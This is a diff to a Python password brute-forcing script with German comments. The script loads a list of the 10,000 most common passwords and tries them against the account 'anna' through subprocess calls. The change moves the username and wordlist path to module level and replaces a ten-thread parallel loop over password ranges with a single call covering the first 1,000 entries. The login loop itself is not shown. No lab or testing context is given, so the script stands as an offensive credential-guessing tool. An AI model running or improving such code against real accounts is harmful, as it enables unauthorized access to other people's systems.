@@ -1,14 +1,13 @@
 import subprocess
-import concurrent.futures
+
+# Pfad zur Datei mit den 10.000 häufigsten Passwörtern
+password_list_path = "./10k-most-common.txt"
+
+# Benutzername, für den das Passwort getestet werden soll
+username = "anna"
 
 # Funktion, die versucht, sich mit einer bestimmten Liste von Passwörtern anzumelden
 def try_passwords(start_range, end_range):
-    # Benutzername, für den das Passwort getestet werden soll
-    username = "anna"
-
-    # Pfad zur Datei mit den 10.000 häufigsten Passwörtern
-    password_list_path = "./10k-most-common.txt"
-
     # Initialisieren des Zählers
     counter = start_range
 
@@ -40,18 +39,5 @@ def try_passwords(start_range, end_range):
             # Erhöhen des Zählers
             counter += 1
 
-# Liste der Bereiche für jeden Prozess
-ranges = [(0, 1000), (1000, 2000), (2000, 3000), (3000, 4000), (4000, 5000),
-          (5000, 6000), (6000, 7000), (7000, 8000), (8000, 9000), (9000, 10000)]
-
-# Starten Sie die Prozesse in einer ThreadPoolExecutor
-with concurrent.futures.ThreadPoolExecutor() as executor:
-    # Starten Sie jede Session in einem separaten Thread
-    futures = [executor.submit(try_passwords, start, end) for start, end in ranges]
-
-    # Warten Sie auf das Ergebnis jeder Session
-    for future in concurrent.futures.as_completed(futures):
-        result = future.result()
-        if result:
-            print(f"Passwort gefunden: {result}")
-            break  # Beenden Sie die Schleife, wenn ein Passwort gefunden wurde
+# Aufrufen der Funktion für den zugewiesenen Passwortbereich
+try_passwords(0, 1000)
